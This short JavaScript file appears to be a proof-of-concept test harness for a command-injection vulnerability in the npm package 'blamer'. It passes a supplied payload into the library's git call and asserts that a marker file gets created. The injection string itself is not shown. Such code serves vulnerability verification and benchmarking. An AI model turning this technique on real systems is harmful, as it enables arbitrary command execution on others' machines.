function exploitFunction(payload) {
  const Root = require("blamer");
  const fs = require("fs");
  const path = "./blamer";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  const root = new Root("git", payload);
  try {
    root.blameByFile("./");
  } catch (err) {
  } finally {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  }
}

module.exports = { exploitFunction };